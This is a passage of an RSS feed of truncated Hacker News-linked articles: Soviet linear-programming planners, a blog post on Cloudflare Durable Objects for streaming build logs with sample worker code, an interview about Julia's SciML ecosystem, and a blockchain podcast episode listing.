<p>In the late 1960’s, a group of economists and computer scientists known as the “optimal planners” began to push for a better way of doing things. The group argued that a technique called <a href="https://www.math.ucla.edu/~tom/LP.pdf">linear programming</a>, invented by <a href="https://en.wikipedia.org/wiki/Leonid_Kantorovich">Leonid Kantorovich</a>, could optimally solve the problems with the supply chain. At a minimum, since the process could be computerized, it would be possible to perform more detailed calculations than could be done by hand, with less dimensionality reduction. But more importantly, linear programming allowed you to optimize arbitrary objective functions given certain constraints. In the case of the supply chain, it showed you how to efficiently allocate resources, identifying efficient factories that should get more input commodities, and inefficient factories that should be shut down.</p>

<div>
  <p><img src="https://chris-said.io/assets/kantorovich.jpg" height="300"></p>
  <p><strong>Figure 2.</strong> Leonid Kantorovich, inventor of linear programming and winner of the 1975 Nobel Prize in Economics.</p>
</div>

<p><br>The optimal planners had some success here. For example, in the steel industry, about 60,000 consumers requested 10,000 different types of products from 500 producers. The producers were not equally efficient in their production. Some producers were efficient for some types of steel products, but less efficient for other types of steel products. Given the total amount of each product requested, and given the constraints of how much each factory can produce, the goal was decide how much each factory should produce of each type of product. If we simplify the problem by just asking how much each factory should produce without considering how the products will be distributed to the consuming factories, this becomes a straightforward application of the <a href="https://www.math.ucla.edu/~tom/LP.pdf">Optimal Assignment Problem</a>, a well-studied example in linear programming. If we additionally want to optimize distribution, taking into account the distance-dependent costs of shipments from one factory to another, the problem becomes more complicated but is still doable. The problem becomes similar to the <a href="https://www.math.ucla.edu/~tom/LP.pdf">Transportation Problem</a>, another well-studied example in linear programming, but in this case generalized to multiple commodities instead of just one.</p>

<p><img src="https://chris-said.io/assets/steel_tubes.jpg" height="200"></p>

<p>By introducing linear programming, the optimal planners were modestly successful at improving the efficiency of some industries, but their effect was limited. First, political considerations prevented many of the recommendations surfaced by the model from being implemented. Cement factories that were known to be too inefficient or too far away from consumers were allowed to remain open even though the optimal solution recommended that they be closed. Second, since the planners were only allowed to work in certain narrow parts of the economy, they never had an opportunity to propagate their recommendations back in the supply chain, although one could imagine extending the models to do so. Third, and perhaps most importantly, the value of each commodity was set by old-school administrators in an unprincipled way, and so the optimal planners were forced to optimize objective functions that didn’t even make sense.</p>

<h4>Ideas about optimizing the entire economy</h4>

<p>While the optimal planners were able to improve the efficiency of a few industries, they had more ambitious plans. They believed they could use linear programming to optimize the entire economy and outperform capitalist societies. Doing so involved more than just scaling out the supply chain optimizations adopted by certain industries. It involved shadow prices and interest rates, and a few other things I’ll admit I don’t totally understand. But while I don’t really understand the implementation, I feel like the broader goal of the planners is easier to understand and explain:</p>

<p>Basically, in a completely free market, at least under <a href="https://en.wikipedia.org/wiki/Arrow%E2%80%93Debreu_model">certain assumptions</a>, prices are supposed to converge to what’s called a General Equilibrium. The equilibrium prices have a some nice properties. They balance aggregate supply and demand, so that no commodities are in shortage or surplus. They are also <a href="https://en.wikipedia.org/wiki/Pareto_efficiency">Pareto efficient</a>, which means that nobody in the economy can be made better off without making someone else worse off.</p>

<p>The optimal planners thought that they could do better. In particular, they pointed to two problems with capitalism: First, prices in a capitalist society were determined by individual agents using trial and error to guess the best price. Surely these agents, who had imperfect information, were not picking the exactly optimal prices. In …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/">https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/</a></em></p>]]>
            </description>
            <link>https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084479</guid>
            <pubDate>Fri, 13 Nov 2020 17:10:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Durable Objects in Production]]>
            </title>
            <description>
<![CDATA[
Score 123 | Comments 55 (<a href="https://news.ycombinator.com/item?id=25084470">thread link</a>) | @geelen
<br/>
November 13, 2020 | https://linc.sh/blog/durable-objects-in-production | <a href="https://web.archive.org/web/*/https://linc.sh/blog/durable-objects-in-production">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>A few weeks ago, Cloudflare announced Durable Objects: a <a href="https://blog.cloudflare.com/introducing-workers-durable-objects/">"truly serverless approach to storage and state"</a>, which piqued our interest here at <a href="https://linc.sh/">Linc</a>. We're already big proponents of Cloudflare Workers (Workers is our <a href="https://linc.sh/why-cloudflare">recommended deploy target</a>, after all), so we're always interested in what new capabilities that platform is getting. But it was this section that sounded <em>ideal</em> for solving a particularly annoying UX problem with much less code/infrastructure than we'd assumed we would need (see the <a href="#building-this-without-durable-objects">comparison section</a> at the end).</p><blockquote><em>Historically ... there was no way to control which instance received a request, [so] there was no way to force two clients to talk to the same Worker... Durable Objects change that: </em><strong><em>requests related to the same topic can be forwarded to the same object, which can then coordinate between them, without any need to touch storage</em></strong><em>.</em></blockquote><p>This is a big deal. And, after a few days tinkering, we've been able to successfully deploy our solution to production! In this post we'll talk about the problem we solved, how Durable Objects work, we'll go through the code and what it's like working with them, and then look at just how much work it saved us.</p><blockquote><strong><em>Note:</em></strong><em> Durable Objects are in </em><a href="http://www.cloudflare.com/cloudflare-workers-durable-objects-beta"><em>limited beta</em></a><em>, and "not recommended for production use" (yet). However, our use-case doesn't push any of the </em><a href="https://developers.cloudflare.com/workers/learning/using-durable-objects#limitations-during-the-beta"><em>beta limits</em></a><em> and we're using it to </em><a href="#the-client"><em>progressively enhance</em></a><em> our existing solution, so we've felt safe </em><a href="#demo"><em>deploying it</em></a><em> to production already!</em></blockquote><h2>The problem—streaming build logs</h2><p>While Linc is a product focussed on automating deployments and previewing each commit, a big part of the day-to-day usage is building commits from source into a <a href="https://fab.dev/">FAB</a>, and viewing the logs of that process is a core piece of the product:</p><figure><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fad68c90ccf85995706ac8a_98383039-e31a9580-2043-11eb-89ee-ca0fd3a9481a.png" alt="image"></p></figure><p>When you're first getting set up, or when something changes in your build or goes awry, you can find yourself poring over these logs to find and fix your issue. And so being able to watch them "live", as they're being built, is a useful tool in reducing your feedback loop (and of course Linc is big on <a href="https://linc.sh/blog/bottleneck">reducing feedback loops</a>!). But that turns out to be an annoyingly difficult feature to implement.</p><p>For starters, most of the time a build will start before any clients are watching (but not always e.g. when restarting a build after a config change). In this case, you need to accumulate a partial build log <em>somewhere</em> so it's ready to send it to the first client to connect. And multiple clients might be watching the same build, and disconnect/reconnect at any moment, too. It's not intractable, but it's just complex enough to be tricky.</p><h3>Our current compromise: reuse our existing GraphQL subscriptions</h3><p>Until now, we've taken a pragmatic approach: use GraphQL subscriptions to periodically flush the entire `Build` record, logs included, every few seconds. This actually reuses our existing live-update infrastructure that powers almost every view in the app:</p><figure><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fae92591d7dddb3a6e3cd2c_Current%20Implementation.png" loading="lazy" alt=""></p></figure><p>So while updates are triggered from DB events, using a GraphQL subscription server in this way gives us an important guarantee: <strong>the clients are <em>always</em> getting the full snapshot of the data that they're interested in</strong>. In other words, <em>any</em> change to a record in the DB results in the client getting a full update of any affected queries from the server—there's no need to manage or merge updates on the client, it can simply replace its local cache with the latest update. It makes a fully live UI <em>much</em> easier to implement, at the expense of some redundant data transfer.</p><p>As a general pattern, it's worked fantastically for us. But to send each log of a current build line-by-line it's way way <em>way</em> too heavy. Not just in terms of sending way more data than necessary, but we'd be absolutely thrashing our Dynamo table &nbsp;<em>even if nobody's watching the logs currently</em>. So, we've taken a compromise: use the existing infrastructure and flush the logs to the DB every ~10 seconds. Most builds take between 2 and 4 minutes so it's only a handful of extra writes, and it feels OK for a stop-gap. We've had an open ticket to build out a dedicated log-streaming solution but the <a href="#building-this-without-durable-objects">amount of additional infrastructure</a> put us off. That is until Durable Objects came along...</p><h2>What are Durable Objects?</h2><blockquote><em>Note: it's worth reading the </em><a href="https://blog.cloudflare.com/introducing-workers-durable-objects/"><em>introductory blog post</em></a><em> to get a background, but this is my best attempt at a TL;DR:</em></blockquote><p>Durable Objects are a way of defining a serverless function as an <strong>instance of a JS class</strong>. They can't be reached by external HTTP requests directly, instead a "normal" (i.e. stateless) Worker creates/accesses instances using their <strong><em>namespace</em></strong> (usually the name of their class) and an <strong><em>id</em></strong>. For a given <strong><em>namespace</em></strong> &amp; <strong><em>id</em></strong>, there will be <strong>exactly one</strong> instance, somewhere in the world, and it can store data. Instances communicate with workers over normal HTTP requests/responses, and support websockets.</p><p>If you find that a bit confusing, you're not alone! I didn't really "get" it until I'd read an example, so I've reproduced and commented our Worker and Object code in <a href="#the-solution">The Solution</a> section below.</p><h3>Durable Objects? "Stateful workers"? "Materialised actors"?</h3><p>I hope it's not terribly controversial, but I'm not a big fan of the name "Durable Objects". It conjures a very data-centric model, where it sounds like a way to... maybe define classes that magically run in the cloud, and where instances... maybe get "frozen" and stored when they go idle? It presents it like a type of database, whereas the reality is much closer to the Worker/Serverless model, just with per-worker storage.</p><p>That said, the phrase "workers with per-worker storage" <em>massively</em> downplays how incredibly transformative this concept is, though, so I get that Cloudflare <em>want</em> it to sound like a "whole new thing". But conceptually, you may be better thinking about these as "materialised <a href="https://en.wikipedia.org/wiki/Actor_model">actors</a>" or, as we've come to coining them internally "stateful workers".</p><p>We'll just call them "Objects" and "instances" in the remainder of this blog post.</p><h3>Instances as a kind of "state"</h3><p>In the documentation, there's a lot of focus on the fact that an Object has its own key-value storage using `controller.storage`. But that API is available only once you have a live <em>instance</em> of an Object, and getting <em>there</em> is actually a whole type of state in disguise.</p><p>The key phrase is <a href="https://blog.cloudflare.com/introducing-workers-durable-objects/#what-is-a-durable-object">here</a>:</p><blockquote><em>Each object has a globally-unique identifier. That object exists in only one location in the whole world at a time. Any Worker running anywhere in the world that knows the object's ID can send messages to it. All those messages end up delivered to the same place.</em></blockquote><p>Combine this with the fact that each Object instance supports websockets, suddenly you can define a system where, as long as two endpoints share some kind of <strong><em>key</em></strong>, they can pass messages directly (kind of the way WebRTC connections are possible when two computers can't talk directly, but can both talk to a <a href="https://en.wikipedia.org/wiki/Traversal_Using_Relays_around_NAT">TURN server</a>). And it turns out, for Linc to stream live build logs to the browser, that's exactly what we need.</p><h2>The solution</h2><p>We already have an ideal shared key: the git SHA of the current commit being built. We actually use the `tree_id` of the commit, not the commit sha, because a `tree_id` is a hash of <em>only the underlying code</em>, not its history or commit message (an aside: this is how Linc can release instantly when you merge an up-to-date PR, without waiting for a new build).</p><p>The solution has 4 components:</p><figure id="w-node-d2c300e41a9b-86b04042"><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fae92d434933bbb702fde0a_Cloudflare%20Architecture.png" loading="lazy" alt=""></p></figure><ul role="list"><li>The "normal" Cloudflare <strong>Worker</strong> that receives requests from the client/builder and connects them to the appropriate Object instance.</li><li>The Durable <strong>Object</strong> itself, which maintains a list of current clients, a history of logs, and broadcasts new log entries from the builder to each client.</li><li>The <strong>Builder</strong>, which is the machine in our AWS cluster that runs `npm run fab:build` on the source code. It hasn't needed to change very much, but now sends logs to the Worker as well as saving them to Dynamo. We sometimes call this "build server" or just "server" in the code.</li><li>The <strong>Client</strong>, which is our normal React app, that needs to reconcile "live" logs from the Worker with the existing data from GraphQL.</li></ul><h3>The Worker</h3><p>It's fair to say that this is the piece that I was most confused about after reading the <a href="https://developers.cloudflare.com/workers/learning/using-durable-objects">guide</a>. It feels like you should just be able to deploy the Object itself and talk to it directly, but the Worker layer makes a lot of sense once it fits into the bigger picture: it's the only way <strong><em>clients</em></strong> (who talk HTTP to their nearest edge location) can talk to <strong><em>Object instances</em></strong> (which run in exactly one place worldwide). </p><p>The simplest possible Worker would look like this:</p><p>--CODE:language-js--<br>export default {<br> &nbsp;async fetch(request, env) {<br> &nbsp; &nbsp;// Convert our key into a Object ID<br> &nbsp; &nbsp;const id = env.MyObjectNamespace.idFromName('some-fixed-value')<br> &nbsp; &nbsp;// Connect to that instance, booting it if necessary<br> &nbsp; &nbsp;const instance = await env.MyObjectNamespace.get(id)<br> &nbsp; &nbsp;// Forward the current HTTP request to it<br> &nbsp; &nbsp;return instance.fetch(request)<br> &nbsp;}<br>}</p><p>Note that this worker uses a single key for all requests (<em>`'some-fixed-value'`</em>) which means <em>_</em>every<em>_ </em>request would be directed to a <em>_</em>single Object instance<em>_</em>. This is almost certainly not what you want in production, but it was handy when getting started (particularly if you change <em>`'some-fixed-value'` </em>once or twice, so you can be sure you're getting a new instance from the last time you deployed).</p><p>Our Worker isn't actually much more complex, but parses the route to find the <em>`tree_id` </em>to direct all requests for a particular build to a shared instance:</p><div><p>--CODE:language-js--<br>export default {<br> &nbsp;async fetch(request, env) {<br> &nbsp; &nbsp;const { pathname } = new URL(request.url)</p><p> &nbsp; &nbsp;// Pro tip: put the parsing of the route in a static method on the Object so you can use it in both places<br> &nbsp; &nbsp;// (note: the Worker and Object have to be in the same file to share the helper function)<br> &nbsp; &nbsp;const route = DurableBuildLog.toRouteParams(pathname)<br> &nbsp; &nbsp;if (!route.match) return notFound()</p><p> &nbsp; &nbsp;// Validate that the Client has access to this Site's build logs<br> &nbsp; &nbsp;if (route.client) {<br> &nbsp; &nbsp; &nbsp;if (!await clientHasAccess(route.sitename, request.headers)) {<br> &nbsp; &nbsp; &nbsp; &nbsp;return notAuthorized()<br> &nbsp; &nbsp; &nbsp;}<br> &nbsp; &nbsp;}</p><p> &nbsp; &nbsp;// Validate that the Build Server is …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://linc.sh/blog/durable-objects-in-production">https://linc.sh/blog/durable-objects-in-production</a></em></p>]]>
            </description>
            <link>https://linc.sh/blog/durable-objects-in-production</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084470</guid>
            <pubDate>Fri, 13 Nov 2020 17:09:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scientific Machine Learning with Julia: The SciML Ecosystem]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25084460">thread link</a>) | @delmatte
<br/>
November 13, 2020 | https://notamonadtutorial.com/scientific-machine-learning-with-julia-the-sciml-ecosystem-b22802951c8a | <a href="https://web.archive.org/web/*/https://notamonadtutorial.com/scientific-machine-learning-with-julia-the-sciml-ecosystem-b22802951c8a">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><h2 id="55b4">Interview with Chris Rackauckas</h2><div><div><div><p><a href="https://federicocarrone.medium.com/?source=post_page-----b22802951c8a--------------------------------" rel="noopener"><img alt="Federico Carrone" src="https://miro.medium.com/fit/c/56/56/2*p2NbnNI4sEc75QvzOZ1gaA.jpeg" width="28" height="28"></a></p></div></div></div><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1140/1*zBLCNU10DE1qv5PG4wdwbg.png" width="570" height="334" srcset="https://miro.medium.com/max/552/1*zBLCNU10DE1qv5PG4wdwbg.png 276w, https://miro.medium.com/max/1104/1*zBLCNU10DE1qv5PG4wdwbg.png 552w, https://miro.medium.com/max/1140/1*zBLCNU10DE1qv5PG4wdwbg.png 570w" sizes="570px" data-old-src="https://miro.medium.com/max/60/1*zBLCNU10DE1qv5PG4wdwbg.png?q=20"></p></div></div></figure><p id="520c">We live in a complex world. For those scientists who dare to immerse themselves in that complexity and generate a deeper understanding of it, it is very common to have to deal with differential equation models that are not possible to solve without the use of a computer.</p><p id="9b3b">A lot of time is usually be spent in coding the part<span id="rmm">i</span>cular differential equation for each problem. Julia SciML works to create and maintain tools that improve this process— from the creation of a framework that allows to automate the pipeline to create and solve problem-specific differential equations with a high level syntax, to introducing machine learning methods to infer unknown components of the model, and many other functionalities.</p><p id="1180">We interviewed the creator of SciML, Chris Rackauckas, to get to know a little more about his work.</p><p id="f037"><em>Join the Not a Monad Tutorial Telegram </em><a href="https://t.me/notamonadtutorial" rel="noopener"><em>group</em></a><em> or </em><a href="https://t.me/channel_notamonadtutorial" rel="noopener"><em>channel</em></a><em> to talk about programming, computer science and papers. See you there!</em></p><p id="92d9"><em>If you are looking for good engineers send me an email to mail@fcarrone.com or you can also reach me via twitter at </em><a href="https://twitter.com/federicocarrone" rel="noopener"><em>@federicocarrone</em></a><em>.</em></p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3540/1*bCCWEZqP_ORcTiLPPV13rw.png" width="1770" height="918" srcset="https://miro.medium.com/max/552/1*bCCWEZqP_ORcTiLPPV13rw.png 276w, https://miro.medium.com/max/1104/1*bCCWEZqP_ORcTiLPPV13rw.png 552w, https://miro.medium.com/max/1280/1*bCCWEZqP_ORcTiLPPV13rw.png 640w, https://miro.medium.com/max/1400/1*bCCWEZqP_ORcTiLPPV13rw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*bCCWEZqP_ORcTiLPPV13rw.png?q=20"></p></div></div></div><figcaption>Source: DifferentialEquations.jl documentation</figcaption></figure><h2 id="8231">Please tell us a bit about yourself. What is your background? what is your current position?</h2><p id="dea8">I am an applied mathematics instructor at MIT, the Director of Scientific Research at Pumas-AI, and a senior research analyst at the University of Maryland, School of Pharmacy. My background is numerical differential equations and systems biology, where my PhD was in new methods for efficient solving of stochastic differential equations to model the control of randomness in the developing zebrafish hindbrain.</p><h2 id="ba5c">What is SciML? Why was it born and what’s its purpose?</h2><p id="57c0">Before the “SciML” organization, there was just DifferentialEquations.jl and JuliaDiffEq, but it grew beyond just a single project. There were methods for symbolically manipulating equations, sparse automatic differentiation, automated model discovery, neural PDE solvers, and even packages in Python and R for using these tools. So the name didn’t fit and we did a reorganization around the central principle: scientific machine learning. Scientific machine learning is a burgeoning field that mixes scientific computing, like differential equation modeling, with machine learning. That is the essence of the organization: many tools for scientific simulation with differential equation solvers, chemical reaction network tools and N-body simulators, but all of them can compose with machine learning.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1920/1*YtKzMw7VOvNbOCsOkXwU0A.png" width="960" height="750" srcset="https://miro.medium.com/max/552/1*YtKzMw7VOvNbOCsOkXwU0A.png 276w, https://miro.medium.com/max/1104/1*YtKzMw7VOvNbOCsOkXwU0A.png 552w, https://miro.medium.com/max/1280/1*YtKzMw7VOvNbOCsOkXwU0A.png 640w, https://miro.medium.com/max/1400/1*YtKzMw7VOvNbOCsOkXwU0A.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*YtKzMw7VOvNbOCsOkXwU0A.png?q=20"></p></div></div></div></figure><h2 id="a3cb">Scientific Computing and Machine Learning are often perceived as very different areas. What would you say are the strengths and weaknesses of each one and how does SciML take advantage of them?</h2><p id="5be4">Scientific computing generally requires a lot of prior knowledge about the system. You need to be able to create a “mechanistic model”, which requires knowing the physical laws, the chemicals which react, or other way to mathematically encode each interaction of the system. If you know this, great! Then you have a very predictive model. You might know all of the chemicals which interact but not know the reaction rates, and then 12 data points can turn this into quite a predictive model. So these models are interpretable (since it’s all about the mechanism), data efficient, etc. They are great at extrapolating too: the theory of gravity gives pretty good predictions for what happens on Earth as it does for the solar system as it does for galaxies.</p><p id="4d96">Data-driven modeling, like machine learning, takes a completely opposite approach of being “data first”. You have a non-mechanistic model, and you “train” the model based on the data. This requires a lot of data, but you can do this even when you have no idea what the mechanism is. What’s the mechanism for what movie someone will want to watch next on Netflix given the previous movies they’ve seen? Einstein didn’t have a theory for that! But with big data, you can generate such a model.</p><p id="66df">Scientific machine learning is about pairing together these two paradigms. Incorporating mechanism into machine learning makes it more interpretable, more data efficient, and better able to predict beyond the training data, all without requiring that you know all of the mechanisms. We’re using this in cases like pharmacometrics, where in the first clinical trial we may not know everything about how the drug works, but we can start with a pretty good guess by using mechanistic models derived for similar drugs, and use the incoming data to train models which transforms the prior model towards the data.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1836/1*ihyMT0ujkdDopf3M8eiXUw.png" width="918" height="746" srcset="https://miro.medium.com/max/552/1*ihyMT0ujkdDopf3M8eiXUw.png 276w, https://miro.medium.com/max/1104/1*ihyMT0ujkdDopf3M8eiXUw.png 552w, https://miro.medium.com/max/1280/1*ihyMT0ujkdDopf3M8eiXUw.png 640w, https://miro.medium.com/max/1400/1*ihyMT0ujkdDopf3M8eiXUw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*ihyMT0ujkdDopf3M8eiXUw.png?q=20"></p></div></div></div></figure><h2 id="d94b">What are Neural ODEs? When is it appropiate to work with one? Do you fear that accuracy or interpretability is lost by introducing a Neural Network as part of the equation? Aren’t there other learning methodologies suited for such a thing?</h2><p id="0b2b">Neural Ordinary Differential Equations or Neural ODEs are ordinary differential equations defined by a neural network. Indeed the result is less interpretable than having a mechanistic physical model, but it allows for the model to be learned directly from data. The neural network makes it not just estimating parameters, but estimating functions. As a middle ground, we created the <a href="https://arxiv.org/abs/2001.04385" rel="noopener">universal differential equation</a> which is a partially mechanistic model where the neural networks fill in areas of the model which are unknown or have a lot of uncertainty. In this sense, there is more of a continuum between the data-driven and mechanistic models.</p><h2 id="29cd">Currently, there exist many differential equations solvers, why do you think this is the case? Is there a way to choose the best one for each situation?</h2><p id="1230">We created an automated algorithm chooser in order to mitigate this issue. If you do 'solve(prob)' (i.e. don’t specify a solver algorithm), it will choose one for you. Then you can give it hints to go down different branches. As time goes on I think we will keep refining that algorithm and pushing more people towards that.</p><h2 id="46c4">What are the key reasons the SciML Differential Equations solver is so fast? How does it differ from others? How influential was writing it in Julia?</h2><p id="1393">Every differential equation solver specializes on some aspect of the differential equation, giving them different performance aspects. For example, BDF integrators, “the standard” for stiff equations, use values from past steps. This can speed things up if the equation is not too stiff, but if it’s too stiff then you cannot use a high order (known as the Dahlquist barrier) and it slows down. So it’s problem dependent as to how well it can mitigate numerical issues, which means for some problems it’s fast and in others it breaks down. Then, if you have discontinuities which are frequent, like dosing in pharmacometrics simulations, this also requires order reduction and thus makes this particular method slower. DifferentialEquations.jl has about 300 methods when you consider all of the tableaus across not just ODEs but also SDEs, DAEs, and DDEs, and it’s this collection that allows it to be efficient.</p><h2 id="bd12">Regarding the importance of being able to quantify the uncertainty of the numerical resolution when solving differential equations, how does SciML address this problem?</h2><p id="dd62">DifferentialEquations.jl comes with a module DiffEqUncertainty.jl that gives sampling-based estimates of numerical uncertainty by causing jitter on the order of the error estimates calculated on each step. Normally these error estimates are only used for adapting dt, but this gives a way to get essentially a free estimate of what other possible paths look like. Andrew Stuart’s group at CalTech then has a full publication that describes that this method indeed matches the error distribution of the full solve. So if you run this a hundred times you’ll get a sense of what all of the possible trajectories could’ve been given the error tolerance that you allowed.</p><h2 id="0bec">What are MultiScaleArrays? In what ways do these data structures help us in simulating complex scientific models?</h2><p id="853b">The differential equation solvers, and actually all of the SciML ecosystem, work on abstract interfaces which allow for the concrete implementation of a type to be radically different from the standard implementation. MultiScaleArrays is a nice example of this where an entire multi-scale model is represented as both a graph structure and an array simultaneously. This lets the user write a model like “for every cell in the lung, do the chemical reactions of a lung cell” to define a model, but have the stiff high-performance ODE solver automatically know how to interact with this object. It’s not even an array: it’s an array of arrays of arrays etc., which acts like an array. In this form it’s very efficient to allows cells to divide and die, and the ODE solver will adapt the size of the solution vector automatically as this changes.</p><p id="a8a3">While this was made for the specific case of multi-scale biological modeling in mind, other users have since come up with other great examples. CuArrays are CUDA-accelerated arrays that live on the GPU that can be dropped in as a replacement to the standard array, or ComponentArrays.jl defines an array type similar to MultiScaleArrays which is backed by a real vector, so it’s faster for standard computations but slower for size changes. A lot of new features can thus be directly added and optimized in the ODE solver just by changing the input types!</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2576/1*crRcFtHznAsYXDCb1uh4oQ.png" width="1288" height="878" srcset="https://miro.medium.com/max/552/1*crRcFtHznAsYXDCb1uh4oQ.png 276w, https://miro.medium.com/max/1104/1*crRcFtHznAsYXDCb1uh4oQ.png 552w, https://miro.medium.com/max/1280/1*crRcFtHznAsYXDCb1uh4oQ.png 640w, https://miro.medium.com/max/1400/1*crRcFtHznAsYXDCb1uh4oQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*crRcFtHznAsYXDCb1uh4oQ.png?q=20"></p></div></div></div></figure><h2 id="0473">Are the processes of solving differential equations and training a Neural Networks similar? How do you put together both frameworks?</h2><p id="e4ec">Training a neural network is solving an ODE defined by the gradient of the loss function until zero. Solving that ODE with Euler’s method is gradient descent. So you could use an ODE solver as the algorithm for training a neural ODE, and there is a use case that we’re looking into for that. Differential equations are more ubiquitous than I think most people realize.</p><h2 id="a904">Is GPU computing integrated in the SciML ecosystem? How important is having this feature to a scientific computing framework nowadays?</h2><p id="48c3">Yes, there’s two major ways. …</p></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://notamonadtutorial.com/scientific-machine-learning-with-julia-the-sciml-ecosystem-b22802951c8a">https://notamonadtutorial.com/scientific-machine-learning-with-julia-the-sciml-ecosystem-b22802951c8a</a></em></p>]]>
            </description>
            <link>https://notamonadtutorial.com/scientific-machine-learning-with-julia-the-sciml-ecosystem-b22802951c8a</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084460</guid>
            <pubDate>Fri, 13 Nov 2020 17:08:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Podcast on the state of blockchains, the web 3 stack, and “scaling trust”]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25084379">thread link</a>) | @wclittle
<br/>
November 13, 2020 | https://satchel.works/@wclittle/ventures-episode-18 | <a href="https://web.archive.org/web/*/https://satchel.works/@wclittle/ventures-episode-18">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>In this episode of <span>Ventures, </span>I discuss with my guests Spencer Graham (<a href="https://twitter.com/spengrah">https://twitter.com/spengrah</a>) and Tony Little (<a href="https://twitter.com/DrTonyLittle">https://twitter.com/DrTonyLittle</a>) the past, present, and future of blockchain technologies and Web 3.0. </p><p>You can watch this episode below or listen on <a href="https://podcasts.apple.com/us/podcast/ventures/id1523559862">Apple Podcasts</a>, <a href="https://open.spotify.com/show/0b65yAwPjDF7hoF78nCIqI">Spotify</a>, <a href="https://podcasts.google.com/?feed=aHR0cHM6Ly9mZWVkcy5idXp6c3Byb3V0LmNvbS8xMjE4NzY3LnJzcw==">Google Podcasts</a>, or wherever you get your podcasts (search for “Ventures”). </p><iframe width="680.0" height="510.0" frameborder="0" allow="autoplay; fullscreen" allowfullscreen="" src="https://www.youtube.com/embed/jrb4oqmZO64?rel=0"></iframe><p>In this episode we cover the following:</p><p>1:59 - Tony intro, including his new job at <a href="https://www.prescryptive.com/">https://www.prescryptive.com/</a>&nbsp;</p><p>2:38 - Spencer intro, Web 3.0 product manager. </p><p>3:50 - Tee-up about exploring the narratives of blockchain, starting first with explaining what blockchain is.</p><p>11:00 - How would Tony talk about the story of blockchain from its origin to today? </p><p>17:00 - A quick caveat from Spencer about the problem of narratives. </p><p>17:56 - How would Spencer talk about the story of blockchain from its origin to today? </p><p>22:17 - What’s up with DeFi (Decentralized Finance? Why has it been all the rage the last couple of years? </p><p>25:00 - Blockchain ecosystem today similar to the “primordial soup” in biology that gave birth to life. The “experiments” happening today are like that early environment, and time will tell what comes out of it and evolves.</p><p>26:36 - Transition from the infrastructure narrative into products. What prevents someone from borrowing money in the DeFi space and running away with it? </p><p>29:52 - Why would someone borrow ~$1k by putting up something like $1.5k in collateral? What is the engine that makes DeFi go right now?</p><p>31:55 - What other products in the DeFi space are catching Spencer’s interest? (discussing risk management products) &nbsp;</p><p>34:59 - What’s up with yield farming and COMP’s governance protocol? (see also <a href="https://www.coindesk.com/defi-yield-farming-comp-token-explained">https://www.coindesk.com/defi-yield-farming-comp-token-explained</a>) </p><p>39:44 - Recapping yield farming and the ability to potentially make more money from owning these tokens in the future. </p><p>42:06 - How active is yield farming now in DeFi? Is it a zero-sum game? </p><p>43:39 - What “net new” types of products can blockchain enable? (discussion around identity, shared governance, company ownership, and the future of work)</p><p>50:30 - Perhaps blockchains simply enable existing products/protocols to be scaled? (Will’s example of chaining internet through neighbors in mountain/valley environments, and a reminder that technology reduces cost and/or increases convenience)</p><p>53:50 - Blockchains as “scaling trust”. </p><p>55:38 - What is “trustless” then? Do we really mean “scaling trust” ? &nbsp;An extreme minimization of trust? What are we trusting in with regard to the blockchain tech and ecosystem? </p><p>57:33 - What is Web 3.0? (A discussion of Web 1.0, Web 2.0, and the sharing of costs, ownership, and outcomes of ventures at the infrastructure and application level in Web 3.0. “Putting communities back in control”) </p><p>1:00:51 - Discussion of <a href="https://filecoin.io/">Filecoin</a>&nbsp;/ IPFS - and <a href="https://thegraph.com/">The Graph</a>&nbsp;- as examples of new Web 3.0 stack components.</p><p>1:02:55 - Discussion of identity, “directory”, and consent. </p><p>1:04:30 - Discussion of Web 1/2/3 transitions as an expansion of protocols and interfaces with those protocols. </p><p>1:05:08 - How do Tony and Spencer think about the future of blockchain? What excites them? </p><p>1:09:06 - How can people find Tony and Spencer online to continue the conversation? <a href="https://www.linkedin.com/in/tony-little-nd/">https://www.linkedin.com/in/tony-little-nd/</a>, <a href="https://twitter.com/DrTonyLittle">https://twitter.com/DrTonyLittle</a>, &nbsp;<a href="https://twitter.com/spengrah">https://twitter.com/spengrah</a>&nbsp; </p>
    </div></div>]]>
            </description>
            <link>https://satchel.works/@wclittle/ventures-episode-18</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084379</guid>
            <pubDate>Fri, 13 Nov 2020 17:03:39 GMT</pubDate>
        </item>
        <item>
            <title>
